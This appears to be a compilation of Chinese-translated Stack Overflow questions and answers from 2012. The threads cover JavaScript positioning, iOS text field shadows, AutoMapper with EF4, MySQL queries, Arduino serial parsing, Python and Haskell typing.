> 赞同：1
> 
> 时间：2012-08-01T01:16:50.550
> 
> 标签：javascript, css-position

我有这个元素，我想将它定位到页面上的特定坐标。问题是**它在另一个定位元素内**，所以 position:absolute 相对于这个元素放置它，而我希望它相对于页面放置。

有什么方法可以将元素放置在页面上的特定坐标处？

您可以在此页面上看到我的内容：http: [//bit.ly/NkfJk7](http://bit.ly/NkfJk7)当您将鼠标悬停在那个黄色感叹号图标上时，我希望粉红色框出现在它附近，但它却以两倍的距离出现。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:24:03.360

我想通了，我做错了。

```
toolTip.style.left = button.offsetLeft + "px";
toolTip.style.top = button.offsetTop + "px"; 
```

无需绝对:)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-01T01:19:37.073

你可以用`position: fixed`这个

[https://developer.mozilla.org/en/CSS/position](https://developer.mozilla.org/en/CSS/position)

> 固定的
> 
> 不要为元素留出空间。相反，将其放置在相对于屏幕视口的指定位置，并且在滚动时不会移动。打印时，将其放置在每一页上的固定位置。

* * *

**编辑：**忽略这个答案。Position-fixed 相对于屏幕的位置，因此它将跟随页面滚动。

# objective-c - UITextField 编辑时不显示阴影

> ID：11751296
> 
> 赞同：5
> 
> 时间：2012-08-01T01:17:14.933
> 
> 标签：objective-c, ios, uikit, core-graphics

我想在带有阴影的 UITextField 中绘制文本。为了做到这一点，我继承了 UITextField，并实现了`drawTextInRect:`如下方法：

```
- (void)drawTextInRect:(CGRect)rect {
    CGContextRef context = UIGraphicsGetCurrentContext();

    // Create shadow color
    float colorValues[] = {0.21875, 0.21875, 0.21875, 1.0};
    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
    CGColorRef shadowColor = CGColorCreate(colorSpace, colorValues);
    CGColorSpaceRelease(colorSpace);

    // Create shadow
    CGSize shadowOffset = CGSizeMake(2, 2);
    CGContextSetShadowWithColor(context, shadowOffset, 0, shadowColor);
    CGColorRelease(shadowColor);

    // Render text
    [super drawTextInRect:rect];    
} 
```

这在文本字段未编辑时非常有用，但一旦开始编辑，阴影就会消失。有什么我想念的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T10:31:41.790

受@jake_hetfield 回答的启发，我创建了一个`UITextField`使用内部标签进行绘图的自定义，请查看：

`ShadowTextField`.h 文件

```
#import <UIKit/UIKit.h>

@interface ShadowTextField : UITextField

// properties to change the shadow color & offset
@property (nonatomic, retain) UIColor *textShadowColor;
@property (nonatomic) CGSize textShadowOffset;

- (id)initWithFrame:(CGRect)frame 
               font:(UIFont *)font 
          textColor:(UIColor *)textColor 
        shadowColor:(UIColor *)shadowColor 
       shadowOffset:(CGSize)shadowOffset;

@end 
```

`ShadowTextField`.m 文件

```
#import "ShadowTextField.h"

@interface ShadowTextField ()
@property (nonatomic, retain) UILabel *internalLabel;
@end

@implementation ShadowTextField
@synthesize internalLabel = _internalLabel;
@synthesize textShadowColor = _textShadowColor;
@synthesize textShadowOffset = _textShadowOffset;

- (id)initWithFrame:(CGRect)frame 
               font:(UIFont *)font 
          textColor:(UIColor *)textColor 
        shadowColor:(UIColor *)shadowColor 
       shadowOffset:(CGSize)shadowOffset
{
    self = [super initWithFrame:frame];
    if (self) {
        // Initialization code

        // register to my own text changes notification, so I can update the internal label
        [[NSNotificationCenter defaultCenter] addObserver:self
                                                 selector:@selector(handleUITextFieldTextDidChangeNotification) 
                                                     name:UITextFieldTextDidChangeNotification
                                                   object:nil];

        self.font = font;
        self.textColor = textColor;

        self.textShadowColor = shadowColor;
        self.textShadowOffset = shadowOffset;
    }
    return self;
}

// when the user enter text we update the internal label 
- (void)handleUITextFieldTextDidChangeNotification
{
    self.internalLabel.text = self.text;

    [self.internalLabel sizeToFit];
}

// init the internal label when first needed
- (UILabel *)internalLabel
{
    if (!_internalLabel) {
        _internalLabel = [[UILabel alloc] initWithFrame:self.bounds];
        [self addSubview:_internalLabel];

        _internalLabel.font = self.font;
        _internalLabel.backgroundColor = [UIColor clearColor];
    }
    return _internalLabel;
}

// override this method to update the internal label color
// and to set the original label to clear so we wont get two labels
- (void)setTextColor:(UIColor *)textColor
{
    [super setTextColor:[UIColor clearColor]];

    self.internalLabel.textColor = textColor;
}

// override this method to update the internal label text
- (void)setText:(NSString *)text
{
    [super setText:text];

    self.internalLabel.text = self.text;

    [self.internalLabel sizeToFit];
}

- (void)setTextShadowColor:(UIColor *)textShadowColor
{
    self.internalLabel.shadowColor = textShadowColor;
}

- (void)setTextShadowOffset:(CGSize)textShadowOffset
{
    self.internalLabel.shadowOffset = textShadowOffset;
}

- (void)drawTextInRect:(CGRect)rect {
    // don't draw anything
    // we have the internal label for that...
}

- (void)dealloc {
    [_internalLabel release];
    [_textShadowColor release];

    [super dealloc];
}

@end 
```

这是您在视图控制器中使用它的方式

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    ShadowTextField *textField = [[ShadowTextField alloc] initWithFrame:CGRectMake(0, 0, 320, 30) 
                                                                   font:[UIFont systemFontOfSize:22.0] 
                                                              textColor:[UIColor whiteColor] 
                                                            shadowColor:[UIColor redColor] 
                                                           shadowOffset:CGSizeMake(0, 1) ] ;
    textField.text = @"This is some text";    
    textField.backgroundColor = [UIColor blackColor];
    [self.view addSubview:textField];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T12:52:56.940

这是以下组件的代码

![在此处输入图像描述](../Images/afde53252b112c4a0efed770fc956c31.png)

```
@interface AZTextField ()
- (void)privateInitialization;
@end

@implementation AZTextField

static CGFloat const kAZTextFieldCornerRadius = 3.0;

- (id)initWithFrame:(CGRect)frame
{

    self = [super initWithFrame:frame];
    if (!self) return nil;
    [self privateInitialization];
    return self;
}

// In case you decided to use it in a nib
- (id)initWithCoder:(NSCoder *)aDecoder
{
    self = [super initWithCoder:aDecoder];
    if (!self) return nil;
    [self privateInitialization];
    return self;
}

- (void)privateInitialization
{
    self.borderStyle = UITextBorderStyleNone;

    self.layer.masksToBounds = NO;
    self.layer.shadowColor = [UIColor blackColor].CGColor;
    self.layer.shadowOffset = CGSizeMake(0.0f, 5.0f);
    self.layer.shadowOpacity = 0.5f;

    self.layer.backgroundColor = [UIColor whiteColor].CGColor;
    self.layer.cornerRadius = 4;

    // This code is better to be called whenever size of the textfield changed,
    // so if you plan to do that you can add an observer for bounds property
    UIBezierPath *shadowPath = [UIBezierPath bezierPathWithRoundedRect:self.bounds cornerRadius:kAZTextFieldCornerRadius];
    self.layer.shadowPath = shadowPath.CGPath;
}

@end 
```

需要考虑的几件事：

*   您想将borderStyle设置为none，否则您最终会使用UIKit将子视图放入您的文本字段
*   根据 Xcode 版本，您可能希望链接 QuartzCore 并`#import <QuartzCore/QuartzCore.h>`
*   对于更复杂的外观，您仍然可以使用图层的阴影属性并将绘图代码本身移动到`drawRect:`方法中，但是如果您覆盖 drawRect 您不想调用 super，jake_hetfield 是正确的，尤其是在方法的末尾
*   至于文本绘制（你可以看到它贴在组件边框附近），你有一个单独的 `drawTextInRect:`and`drawPlaceholderInRect:`方法分别绘制文本和占位符
*   您可以使用 UIColor 方法获取颜色并调用 CGColor 属性，它使代码更具可读性和更易于维护

希望有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-09T10:39:21.023

停止调用 super 并自己渲染文本。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T15:02:42.473

您可以尝试自己绘制标签。消除

```
[super drawTextInRect:rect] 
```

而是绘制自己的标签。我还没有尝试过，但它可能看起来像这样：

```
// Declare a label as a member in your class in the .h file and a property for it:
UILabel *textFieldLabel;
@property (nonatomic, retain) UILabel *textFieldLabel;

// Draw the label
- (void)drawTextInRect:(CGRect)rect {
    if (self.textFieldLabel == nil) {
        self.textFieldLabel = [[[UILabel alloc] initWithFrame:rect] autorelease];
        [self.view addSubview:myLabel];
    }

    self.textFieldLabel.frame = rect;
    self.textFieldLabel.text = self.text;

    /** Set the style you wish for your label here **/
    self.textFieldLabel.shadowColor = [UIColor grayColor];
    self.textFieldLabel.shadowOffset = CGSizeMake(2,2);
    self.textFieldLabel.textColor = [UIColor blueColor];

    // Do not call [super drawTextInRect:myLabel] method if drawing your own text
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-10T14:28:11.937

您是否尝试过 CALayer 的标准阴影属性？它通常就足够了，而且要简单得多。用常规的 UITextField 尝试这样的事情：

```
self.inputContainer.layer.shadowColor=[UIColor blackColor].CGColor;
self.inputContainer.layer.shadowRadius=8.0f;
self.inputContainer.layer.cornerRadius=8.0f;
self.inputContainer.layer.shadowOffset=CGSizeMake(0, 4); 
```

你当然需要先导入 QuartzCore！

```
#import <QuartzCore/QuartzCore.h> 
```

# c# - 向 VS 2008 项目添加 DLL 引用

> ID：11751298
> 
> 赞同：0
> 
> 时间：2012-08-01T01:17:28.713
> 
> 标签：c#, .net, visual-studio, visual-studio-2008, reference

我有一个有 2 个项目的 vs 2008 解决方案。一个引用另一个，但我需要向其中一个项目添加一个 DLL。我转到解决方案资源管理器，右键单击并转到添加参考。它给了我 2 个选项卡：项目和 SQL Server。

在项目中，我看到了我的另一个项目并将其添加到。SQL Server 是空白的。但是如何只添加一个 DLL？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T01:27:17.547

您必须正在创建 SQL Server 项目。要在 SQL Server 项目中添加 DLL 引用，您必须先将该 dll 注册到 sql server。如何使用 SQL SERVER 注册 dll？在 codeproject 上查看[本教程。](http://www.codeproject.com/Articles/19954/Execute-NET-Code-under-SQL-Server-2005)注册 dll 后，它将在 SQL Server 选项卡中可供参考。

# android - 使用 GridView 为日历创建周视图或日视图的最佳方法是同时获得正确的时间？

> ID：11751299
> 
> 赞同：0
> 
> 时间：2012-08-01T01:17:33.923
> 
> 标签：android, calendar, android-gridview

所以我决定使用`GridView`. 获得一个单独的一天或一周并放置与之对应的事件并不是那么糟糕。但是有一件事我不知道如何正确实施。我也想把事件放在正确的时间范围内，如果可能的话，精确到分钟。我希望就如何实现这一点得到一些建议。感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T02:03:53.397

您绝对可以在月份 GridView 的每个单元格中拥有一天的 GridView。虽然不知道表演会是什么样子。也许最好创建自己的面板来覆盖 onMeasure 和 onLayout 以将事件放在正确的位置。

# mysql - 我如何判断“状态”的最后 x 行是否 = 1

> ID：11751306
> 
> 赞同：0
> 
> 时间：2012-08-01T01:18:30.020
> 
> 标签：mysql, sql

我需要有关 SQL 查询的帮助。

我有一个带有“状态”列的表。0 表示关闭，1 表示打开。

不同的用户希望在发生 x 次连续 1 事件后得到通知。

使用 SQL 查询，我如何判断“状态”的最后 x 行是否 = 1？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:43:16.317

例如，如果您想检查最后 5 个连续行的状态是否等于 1，那么您可以这样做：

```
SELECT IF(SUM(x.state) = 5, 1, 0) AS is_consecutive 
FROM (
    SELECT state 
    FROM table 
    WHERE Processor = 3
    ORDER BY Status_datetime DESC
    LIMIT 5
) as x 
```

如果`is_consecutive = 1`，那么，是的，有 5 个最后连续的行`state = 1`。

**编辑**：正如评论中所建议的那样，您必须`ORDER BY`在查询中使用才能获取最后 n 行。

为了更准确，因为你有一个时间戳列，你应该使用`Status_datetime`来对行进行排序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:07:29.987

您应该能够使用这样的东西（将 中的数字替换`HAVING`为`x`您要检查的值）：

```
SELECT Processor, OpenCount FROM
(
  SELECT TOP 10 Processor, DateTime, Sum(Status) AS OpenCount
   FROM YourTable
   WHERE Processor = 3
   ORDER BY DateTime DESC
) HAVING OpenCount >= 10 
```

# gps - Arduino替换代码

> ID：11751307
> 
> 赞同：1
> 
> 时间：2012-08-01T01:18:36.593
> 
> 标签：gps, arduino

我对 Arduino 和 C 编程非常陌生。

我正在制作一个 GPS speedo，我正在尝试读取一些序列，从子字符串中存储一个值并通过序列回显它。

目前我在存储子字符串时遇到问题。

我已经到了能够在`<`和之间获取一些数据的地步`>`。但数据不是那样进来的。这是一个 NMEA 数据流，我想要的数据介于`,N,`和之间`,K,`。

所以我一直在尝试`,N,`用`<` 和`,K,`替换`>`。

只是无法让它工作。我明白了`error: request for member 'replace' in 'c', which is of non-class type 'char'`

到目前为止，这是我的代码....

```
int indata = 0;
int scrubdata = 0;
char inString[32];
int stringPos = 0;
boolean startRead = false; // is reading?

void setup() {
  Serial.begin(4800);
}

void loop() {
  String pageValue = readPage();
  Serial.print(pageValue);
}

String readPage(){
  //read the page, and capture & return everything between '<' and '>'

  stringPos = 0;
  memset( &inString, 0, 32 ); //clear inString memory

  while(true){
    if (Serial.available() > 0) {

      char c = Serial.read();
      c.replace(",N,", "<");
      c.replace(",K,", ">");

      if (c == '<' ) { //'<' is our begining character
        startRead = true; //Ready to start reading the part 
      }
      else if(startRead){

        if(c != '>'){ //'>' is our ending character
          inString[stringPos] = c;
          stringPos ++;
        }
        else{
          //got what we need here! We can disconnect now
          startRead = false;
          return inString;
        }
      }
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T04:16:48.650

## By Default:

[`Serial.read()`](http://arduino.cc/en/Serial/Read) returns an `int` if you must process the data this way, try casting it to `char` with:

```
 char c = (char) Serial.read(); 
```

## Another way to do this:

Would be to seek your beginning string (discarding un-needed data) using [`Serial.find()`](http://arduino.cc/en/Serial/Find) then reading data until you met your end character "**,K,**" with [`Serial.readBytesUntil()`](http://arduino.cc/en/Serial/ReadBytesUntil)

Something like this would work quite well:

```
char inData[64];         //adjust for your data size
Serial.setTimeout(2000); //Defaults to 1000 msecs set if necessary
Serial.find(",N,");      //Start of Data
int bRead = Serial.readBytesUntil(",K,", inData, 64);  //Read until end of data
inData[bRead] = 0x00;    //Zero terminate if using this as a string
return inData; 
```

# python - Python：找出“配偶”类？

> ID：11751308
> 
> 赞同：5
> 
> 时间：2012-08-01T01:18:36.920
> 
> 标签：python, oop, class, multiple-inheritance

所以在这里我有一个问题。假设我有 2 个父类。他们都继承自大师班。然后它们都是子类的父类。有没有办法弄清楚（假设我是父亲）我“和哪个母亲班有孩子”？我不需要孩子弄清楚是哪个母班，我希望父亲能够弄清楚它是哪个母班。

我知道这是一个愚蠢的例子，但它是我必须在其他地方做的事情的简化版本。

```
class Master(object):
    def __init__(self):
        self.troll()
        self.trell()

class Mother1(Master):
    def troll(self):
        print 'troll1'

class Mother2(Master):
    def troll(self):
        print 'troll2'

class Father(Master):
    def trell(self):
        print 'trell'
        print self.figure_out_spouse_class()

class Child1(Mother1, Father):
    pass

class Child2(Mother2, Father):
    pass

c = Child1() #should print 'Mother1'
c = Child2() #should print 'Mother2' 
```

~
~
~
~

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-01T01:35:50.423

您可以使用`__bases__`：

```
def figure_out_spouse_class(self):
    return [b.__name__ for b in self.__class__.__bases__ if b != Father] 
```

（如果有多个“配偶”类，这将返回所有“配偶”类的名称）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:40:28.703

您可以查看`__bases__`子对象的类，例如

```
class Father(Master):
    def trell(self):
        print self.__class__.__bases__[0]
        super(self.__class__, self).troll() 
```

# asp.net-mvc - Automapper + EF4 + ASP.NET MVC - 得到“上下文处理”错误（我知道为什么，但如何解决？）

> ID：11751313
> 
> 赞同：6
> 
> 时间：2012-08-01T01:19:04.813
> 
> 标签：asp.net-mvc, entity-framework, closures, automapper

我在 MVC 控制器操作中有这个非常基本的代码。它将模型类映射`Operation`到一个非常基本`OperationVM`的视图模型类。

```
public class OperationVM: Operation 
{
    public CategoryVM CategoryVM { get; set; }
} 
```

我需要加载完整的类别列表才能创建 CategoryVM 实例。
这是我（尝试）创建一个`List<OperationVM>`在视图中显示的方法。

```
public class OperationsController : Controller {

    private SomeContext context = new SomeContext ();

    public ViewResult Index()
    {
        var ops = context.Operations.Include("blah...").ToList();
        Mapper.CreateMap<Operation, OperationVM>()
            .ForMember(
                dest => dest.CategoryVM, 
                opt => opt.MapFrom(
                    src => CreateCatVM(src.Category, context.Categories)
                    //  trouble here ----------------^^^^^^^
                )
            );
        var opVMs = ops.Select(op => Mapper.Map<Operation, OperationVM>(op))
                       .ToList();

        return View(opVMs);
    }
} 
```

我第一次点击页面时一切都很好。问题是，映射器对象是静态的。因此，在调用 时`Mapper.CreateMap()`，当前的实例`DbContext`保存在给 CreateMap() 的闭包中。

我第二次点击页面时，静态地图已经到位，仍然使用对初始的引用，现在已处置，`DbContext`.

确切的错误是：

```
The operation cannot be completed because the DbContext has been disposed. 
```

问题是：如何使 AutoMapper 始终使用*当前*上下文而不是初始上下文？

有没有办法使用自动映射器的“实例”而不是静态`Mapper`类？如果可以，是否建议每次都重新创建映射？我担心反射速度变慢。

我阅读了一些关于自定义解析器的信息，但我遇到了类似的问题 - 如何让自定义解析器使用当前上下文？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T18:29:19.497

这是可能的，但设置有点复杂。我在 Ninject 的帮助下在我的项目中使用它来进行依赖注入。

AutoMapper 有 TypeConverters 的概念。转换器提供了一种方法来实现在单独的类中转换某些类型所需的复杂操作。如果将 Category 转换为 CategoryVM 需要数据库查找，您可以在自定义 TypeConverter 类中实现该逻辑，类似于：

```
using System;
using AutoMapper;

public class CategoryToCategoryVMConverter : 
        TypeConverter<Category, CategoryVM>
{
    public CategoryToCategoryVMConverter(DbContext context)
    {
        this.Context = context;
    }

    private DbContext Context { get; set; }

    protected override CategoryVM ConvertCore(Category source)
    {
        // use this.Context to lookup whatever you need
        return CreateCatVM(source, this.Context.Categories);
    }
} 
```

然后您配置 AutoMapper 以使用您的转换器：

```
Mapper.CreateMap<Category, CategoryVM>().ConvertUsing<CategoryToCategoryVMConverter>(); 
```

棘手的部分来了。每次映射值时，AutoMapper 都需要创建转换器的新实例，并且需要为构造函数提供 DbContext 实例。在我的项目中，我使用 Ninject 进行依赖注入，它被配置为在处理请求时使用相同的 DbContext 实例。这样，在控制器和 AutoMapper 转换器中都注入了相同的 DbContext 实例。简单的 Ninject 配置如下所示：

```
Bind<DbContext>().To<SomeContext>().InRequestScope(); 
```

您当然可以使用某种工厂模式来获取 DbContext 的实例，而不是在构造函数中注入它。

如果您有任何问题，请告诉我。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:14:41.603

我找到了一个不完全hacky的解决方法。基本上，我告诉 AutoMapper 忽略棘手的字段，然后我自己更新它。

更新后的控制器如下所示：

```
public class OperationsController : Controller {

    private SomeContext context = new SomeContext ();

    public ViewResult Index()
    {
        var ops = context.Operations.Include("blah...").ToList();
        Mapper.CreateMap<Operation, OperationVM>()
            .ForMember(dest => dest.CategoryVM, opt => opt.Ignore());

        var opVMs = ops.Select(
            op => {
                var opVM = Mapper.Map<Operation, OperationVM>(op);
                opVM.CategoryVM = CreateCatVM(op.Category, context.Categories);
                return opVM;
            })
            .ToList();

        return View(opVMs);
    }
} 
```

仍然很好奇如何从 AutoMapper 中完成这...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-05T21:44:04.640

@LeffeBrune 的答案是完美的。但是，我希望有相同的行为，但我不想自己映射每个属性。基本上我只是想覆盖“ConstructUsing”。

这是我想出的。

```
public static class AutoMapperExtension
{
    public static void ConstructUsingService<TSource, TDestination>(this IMappingExpression<TSource, TDestination> mappingExression, Type typeConverterType)
    {
        mappingExression.ConstructUsing((ResolutionContext ctx) =>
        {
            var constructor = (IConstructorWithService<TSource, TDestination>)ctx.Options.ServiceCtor.Invoke(typeConverterType);
            return constructor.Construct((TSource)ctx.SourceValue);
        });
    }
}

public class CategoryToCategoryVMConstructor : IConstructorWithService<Category, CategoryVM>
{
    private DbContext dbContext;

    public DTOSiteToHBTISiteConverter(DbContext dbContext)
    {
        this.dbContext = dbContext;
    }

    public CategoryVM Construct(Category category)
    {
        // Some commands here
        if (category.Id > 0)
        {
            var vmCategory = dbContext.Categories.FirstOrDefault(m => m.Id == category.Id);
            if (vmCategory == null)
            {
                throw new NotAllowedException();
            }

            return vmCategory;
        }

        return new CategoryVM();
    }
}

// Initialization
Mapper.Initialize(cfg =>
{
    cfg.ConstructServicesUsing(type => nInjectKernelForInstance.Get(type));
    cfg.CreateMap<Category, CategoryVM>().ConstructUsingService(typeof(CategoryToCategoryVMConstructor));
}; 
```

# c# - 验证检查数据库中的重复数据

> ID：11751314
> 
> 赞同：0
> 
> 时间：2012-08-01T01:19:07.587
> 
> 标签：c#, arrays, linq

我遇到了一个问题，每当用户创建新记录时，程序必须检查数据是否已经创建。我的代码目前有一些错误，我找不到错误所在。谁能给我一些意见？？谢谢！

下面是代码，让你们对我的问题有更多的了解。

```
private void btnCreate_Click(object sender, EventArgs e)
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            //int[] stations = StationNameList();
            //int[] locations = LocationNameList();
            locationstation ls = new locationstation();
            ls.stationID = Convert.ToInt32(cbStation.SelectedValue);
            ls.locationID = Convert.ToInt32(cbLocation.SelectedValue);

            var checkLS = from CLS in Setupctx.locationstations
                          where CLS.stationID == Convert.ToInt32(cbStation.SelectedValue)
                          where CLS.locationID == Convert.ToInt32(cbLocation.SelectedValue)
                          select CLS;
            if (checkLS = checked)
            {
                MessageBox.Show("This Location Station Has Been Created. Please enter a new Location Station.");
            }     
            else
                    {
                        {
                            Setupctx.locationstations.AddObject(ls);
                            Setupctx.SaveChanges();

                            cbStation.SelectedIndex = -1;
                            cbLocation.SelectedIndex = -1;

                            MessageBox.Show("New Location Station Is Created");
                        }
                    }
        }
    } 
```

需要比较的列保存在数组中

```
private int[] LocationNameList()
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            return Setupctx.locationstations.Select(x => x.locationID).OrderBy(x => x).ToArray();
        }
    }

    private int[] StationNameList()
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            return Setupctx.locationstations.Select(y => y.stationID).OrderBy(y => y).ToArray();
        }
    } 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:54:29.000

这个答案对我有用，因为我自己想通了。

```
private void btnCreate_Click(object sender, EventArgs e)
    {
        using (satsEntities Setupctx = new satsEntities())
        {
            locationstation ls = new locationstation();
            int Stations = Convert.ToInt32(cbLocation.SelectedValue);
            int Locations = Convert.ToInt32(cbStation.SelectedValue);
            ls.stationID = Convert.ToInt32(cbStation.SelectedValue);
            ls.locationID = Convert.ToInt32(cbLocation.SelectedValue);

            var AuthCheck = from Ls in Setupctx.locationstations
                            where (Ls.locationID == Stations && Ls.stationID == Locations)
                            select Ls;

            if (AuthCheck.Count() != 0)
            {
                MessageBox.Show("This Location Station Has Been Created. Please enter a new Location Station.");
            }     
            else
            {
                Setupctx.locationstations.AddObject(ls);
                Setupctx.SaveChanges();

                cbStation.SelectedIndex = -1;
                cbLocation.SelectedIndex = -1;

                MessageBox.Show("New Location Station Is Created");     
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:45:17.520

一种粗略的方法是在这两列上创建一个唯一索引，并尝试保存在 try/catch 块中。

# python - Python对值为多维列表的字典进行排序

> ID：11751315
> 
> 赞同：0
> 
> 时间：2012-08-01T01:19:14.480
> 
> 标签：python, sorting, dictionary, multidimensional-array

我有以下字典：

```
DICT = {'ABC': [[u'2012-07-19', 1.22, 1, 1.22, 1, 0], [u'2012-04-26', 1.33, 210, 1.33, 210, 0], [u'2011-11-14', 1.25, 171, 1.32, 241, 70]], 
'XYZ': [[u'2012-02-17', 1.82, 59, 1.25, 182, 123], [u'2011-04-06', 1.50, 30, 1.18, 54, 24], [u'2011-01-06', 1.21, 38, 1.17, 41, 3], [u'2010-06-21', 1.28, 26, 1.28, 26, 0]]} 
```

值是二维列表。

如何根据第三列值对键进行排序。

让我解释一下：键“ABC”的第三列最小值是 1.22（在 1.22、1.33 和 1.32 之间）。键“XYZ”的第三列最小值为 1.17（在 1.25、1.18、1.17 和 1.28 之间）。由于 1.17 > 1.22 'XYZ' 将是第一个，然后是 'ABC'。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:30:56.633

您可以使用`sorted`带有 key 函数的 python 内置函数来挑选要用作排序键的迭代的特定特征：

```
>>> [l[1] for l in DICT['XYZ']]
[1.82, 1.5, 1.21, 1.28]
>>> min(l[1] for l in DICT['ABC'])
1.22
>>> sorted(DICT, key=lambda k: min(l[1] for l in DICT[k]))
['XYZ', 'ABC'] 
```

# php - 如何在同一个表中将数据从一行复制到另一行？

> ID：11751316
> 
> 赞同：0
> 
> 时间：2012-08-01T01:19:21.753
> 
> 标签：php, mysql

我正在尝试从一行中的特定列复制数据，并将其插入/更新到另一行中，所有这些都在同一个表中。每行已经有一个 ID #（称为 order_no），因此不需要自动递增。

我认为这很简单，但它只是行不通。我的表名是“orders”，列被称为“rn”和“phone”，order_no 是“416”和“417”。我希望将 rn 和来自 416 的电话插入 rn，并将电话列插入 417。

我也试过这个查询，试图只复制一条记录 rn，没有成功并得到**错误：#1248 - 每个派生表都必须有自己的别名**

```
mysql_query("UPDATE orders
  SET rn =
     ( SELECT rn
        FROM ( SELECT rn
                FROM orders
                  WHERE order_no = 416
             ) 
 WHERE order_no = 417 "); 
```

我试过这个没有成功，并得到**错误 #1136 - 列数与第 1 行的值计数不匹配**

```
 mysql_query
(" INSERT INTO orders (rn, phone)
SELECT rn, phone, 416
from orders
WHERE order_no = 417 "); 
```

**更新。**我也在下面尝试了这个查询，只有一个字段 (rn) 无济于事，它会引发错误 #1093 - You can't specify target table 'orders' for update in FROM 子句：

```
 mysql_query("UPDATE orders 
SET rn = (SELECT rn FROM orders WHERE order_no = '416') 
WHERE order_no = '417' "); 
```

非常感谢任何帮助或帮助。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:35:20.927

这几乎是正确的方法......试试这个

```
INSERT INTO orders  (rs, phone)
SELECT rs, phone
from orders
WHERE id = 416 
```

它将创建您的 id #417

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-21T14:48:19.057

不能在 update 和 value 语句中使用同一张表，因为它会导致无限循环。您应该使用这样的临时表：

```
CREATE TEMPORARY TABLE temp_tb_name(SELECT * FROM original_table WHERE where_case);
UPDATE original_table SET field_name = (SELECT field_name FROM temp_tb_name WHERE where_case) WHERE where_case;
DROP TEMPORARY TABLE IF EXISTS temp_tb_name 
```

如果您忘记删除临时表，它将在 db_connection 断开时自动删除

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T01:30:14.037

您可以修改您的查询

```
mysql_query
(" INSERT INTO orders (rn, phone)
SELECT rn, phone, 416
WHERE order_no = 417 "); 
```

至

```
mysql_query
(" INSERT INTO orders (rn, phone)
SELECT rn, phone, 416
from orders
WHERE order_no = 417 "); 
```

# haskell - 不完整的类型签名

> ID：11751318
> 
> 赞同：7
> 
> 时间：2012-08-01T01:19:28.037
> 
> 标签：haskell, ghc, type-inference

假设我们有一个类似 f 的函数，它返回一个 monad。然而，在你看到的地方`Int`，假装它是一个非常复杂的类型。

```
f :: (Monad m) => m Int -- Pretend this isn't Int but something complicated
f = return 42 
```

现在让我们说我们想强制它进入`Maybe`monad。我们不需要编写完整的类型`f`来执行此操作，我们可以执行以下操作：

```
g :: Maybe a -> Maybe a
g = id

main = print $ (g f) 
```

哑函数`g`强制`f`变为`Maybe`。

我认为上面的内容相当混乱。我宁愿写的是这样的：

```
main = print $ (f :: Maybe a) 
```

但它失败并出现以下错误：

```
Couldn't match expected type `a' against inferred type `Int'
  `a' is a rigid type variable bound by
      the polymorphic type `forall a. Maybe a' at prog.hs:7:16
  Expected type: Maybe a
  Inferred type: Maybe Int
In the second argument of `($)', namely `(f :: Maybe a)'
In the expression: print $ (f :: Maybe a) 
```

有没有办法以`g`不涉及创建新功能的不那么混乱的方式完成上述工作？我不想写`f :: Maybe Int`，因为如果返回类型发生变化，它就会成为维护问题。GHC 扩展在答案中是可以的。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-01T01:38:19.160

使用[`asTypeOf`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html#v:asTypeOf). 它返回第一个参数，同时将其类型与第二个参数统一。它只是 的类型限制版本`const`，但在这种情况下很有用。

```
main = print $ f `asTypeOf` (undefined :: Maybe a) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-01T05:40:06.587

另一种方法是限制 的类型`print`：

```
main = (print :: Show a => Maybe a -> IO ()) f 
```

更新：
GHC 8.0.1 引入了[TypeApplications](https://downloads.haskell.org/%7Eghc/8.10.7/docs/html/users_guide/glasgow_exts.html#visible-type-application)扩展，可用于强制`Maybe`：

```
{-# LANGUAGE TypeApplications #-}

main = print $ f @Maybe 
```

# ios - iOS中是否有一个总是被调用的init方法？

> ID：11751321
> 
> 赞同：5
> 
> 时间：2012-08-01T01:19:38.233
> 
> 标签：ios, objective-c, cocoa-touch, init

有没有在 Cocoa 中总是被调用的方法？许多类都有`init`or `initWith`，但更糟糕的是，它们可以从 nib 或其他东西加载。在这种情况下，我不想四处寻找它是如何做到的。我只想设置一些初始变量和其他东西，并且我想要一个方法来子类化，无论它是 a还是等`UIView`，我都可以依赖它。`UIViewController``UITableViewCell`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-01T01:30:39.570

